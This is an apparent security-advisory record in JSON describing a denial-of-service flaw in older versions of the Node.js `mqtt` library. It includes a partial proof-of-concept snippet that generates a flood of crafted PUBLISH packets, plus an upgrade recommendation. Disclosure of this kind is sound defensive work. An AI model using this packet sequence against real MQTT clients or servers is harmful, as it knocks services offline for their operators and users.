{"description": "Affected versions of `mqtt` do not properly handle PUBLISH packets returning from the server, leading to a Denial of Service condition.\n\nThe vulnerability is completely mitigated if the only connected servers are trusted, guaranteed not to be under the control of a malicious actor.\n\n## Proof of Concept\n\nThe following is a demonstration of how to generate the malicious packet sequence, but does not include information on handling the initial network connections and MQTT overhead.\n```\nvar mqttp = require('mqtt-packet');\nvar packets = [];\nfor(var i=0; i<=1000;i++){\n    packets.push(\n        mqttp.generate({\n            cmd:'publish',\n            topic:Buffer.from('hello'),\n            payload:Buffer.from('world'),\n            retain: false,\n            dup: false, \n            messageId: ++i, \n            qos: 1\n        })\n    )\n}\n\n```\n\n\n## Recommendation\n\nUpdate to version 2.15.0 or later.", "methods": ["Sent malicious packets to cause a Denial of Service condition.", "Exploited a vulnerability in the MQTT protocol to cause a Denial of Service condition.", "Used a sequence of PUBLISH packets to cause a Denial of Service condition."]}
